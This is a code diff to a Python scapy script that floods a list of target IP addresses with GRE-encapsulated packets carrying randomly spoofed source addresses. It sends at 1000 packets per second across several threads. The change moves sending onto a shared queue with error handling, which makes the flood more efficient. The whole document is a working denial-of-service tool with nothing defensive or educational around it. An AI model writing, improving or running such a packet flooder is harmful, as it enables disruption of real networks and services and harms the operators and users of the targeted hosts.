@@ -1,6 +1,7 @@
 from scapy.all import IP, sendpfast, GRE, UDP, Raw
 import random
 import threading
+import queue
 
 def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64):
     ip = IP(src=source_ip, dst=dest_ip, ttl=ttl)
@@ -16,16 +17,28 @@ def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64)
     return packet
 
 def send_gre_ip_packets(target_ips, num_packets=10, num_threads=10):
-    def send_packets():
-        for _ in range(num_packets):
-            for target_ip in target_ips:
-                source_ip = random_ip()
-                packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
+    def send_packets(packet_queue):
+        while True:
+            try:
+                packet = packet_queue.get_nowait()
+            except queue.Empty:
+                break
+            try:
                 sendpfast(packet, pps=1000, verbose=False)
+            except Exception as e:
+                print(f"Error sending packet: {e}")
+
+    packet_queue = queue.Queue()
+    
+    for _ in range(num_packets):
+        for target_ip in target_ips:
+            source_ip = random_ip()
+            packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
+            packet_queue.put(packet)
     
     threads = []
     for _ in range(num_threads):
-        thread = threading.Thread(target=send_packets)
+        thread = threading.Thread(target=send_packets, args=(packet_queue,))
         threads.append(thread)
         thread.start()
     
